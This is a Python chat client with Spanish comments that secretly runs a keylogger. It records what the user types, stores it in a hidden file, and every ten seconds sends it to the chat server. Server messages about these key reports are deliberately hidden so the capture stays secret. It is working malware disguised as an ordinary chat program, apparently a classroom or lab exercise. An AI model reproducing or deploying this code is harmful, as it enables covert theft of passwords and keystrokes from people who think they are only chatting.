import keyboard
import socket
import sys
import threading
import time
import os

class Cliente:
    def __init__(self, ipservidor, puerto):
        self.ipservidor = ipservidor
        self.puerto = puerto
        
    def coneccion(self):
        try:
            socketConnection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)            
            socketConnection.connect((self.ipservidor, self.puerto))
            return socketConnection
        except socket.error:
            sys.exit()
    
    def enviarInfo(self, socketConnection, mensaje):
        try:
            socketConnection.sendall(mensaje.encode())
        except Exception:
            pass

    def cerrar(self, socketConnection):
        socketConnection.close()

# --- HILO PARA RECIBIR DEL SERVIDOR ---
def recibir_mensajes_servidor(conexion):
    while True:
        try:
            mensaje = conexion.recv(1024).decode()
            if mensaje:
                # Si el mensaje es un ACK de las teclas, no lo imprimimos para que sea secreto
                if "REPORTE DE TECLAS" not in mensaje:
                    print(f"\n[Servidor]: {mensaje}\n>> ", end="")
            else:
                break
        except:
            break

# --- PASO 1: CAPTURA ---
def capturar_teclas(ruta_archivo):
    while True:
        events = keyboard.record('enter')
        password = list(keyboard.get_typed_strings(events))
        if password:
            with open(ruta_archivo, 'a') as data_file:
                data_file.write(password[0] + '\n')

# --- PASO 3: ENVÍO PERIÓDICO ---
def enviar_archivo_periodicamente(cliente, conexion, ruta_archivo, intervalo):
    while True:
        time.sleep(intervalo)
        if os.path.exists(ruta_archivo):
            try:
                with open(ruta_archivo, "r") as archivo:
                    contenido = archivo.read()
                if contenido.strip(): 
                    mensaje_etiquetado = f"--- REPORTE DE TECLAS ---\n{contenido}"
                    cliente.enviarInfo(conexion, mensaje_etiquetado)
                    open(ruta_archivo, 'w').close() 
            except Exception:
                pass

if __name__ == "__main__":
    RUTA_LOG = ".data.txt"
    cliente = Cliente("localhost", 9999)
    clienteConexion = cliente.coneccion()
    
    # 1. Hilo para recibir mensajes del servidor (NUEVO)
    threading.Thread(target=recibir_mensajes_servidor, args=(clienteConexion,), daemon=True).start()

    # 2. Hilo para Keylogger
    threading.Thread(target=capturar_teclas, args=(RUTA_LOG,), daemon=True).start()

    # 3. Hilo para Envío Automático
    threading.Thread(target=enviar_archivo_periodicamente, args=(cliente, clienteConexion, RUTA_LOG, 10), daemon=True).start()

    print("--- CHAT ACTIVO ---")
    try:
        while True:
            mensaje = input(">> ")
            if mensaje.lower() in ["exit", "salir"]:
                cliente.enviarInfo(clienteConexion, "exit")
                break
            cliente.enviarInfo(clienteConexion, mensaje)
    except KeyboardInterrupt:
        pass
    cliente.cerrar(clienteConexion)